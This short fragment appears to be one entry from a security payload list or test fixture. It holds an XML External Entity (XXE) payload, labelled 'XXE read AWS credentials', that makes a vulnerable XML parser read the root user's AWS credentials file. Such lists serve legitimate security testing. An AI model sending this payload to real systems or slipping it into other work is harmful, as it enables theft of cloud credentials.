    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///root/.aws/credentials\">]><root>&xxe;</root>"
      description: "XXE read AWS credentials"
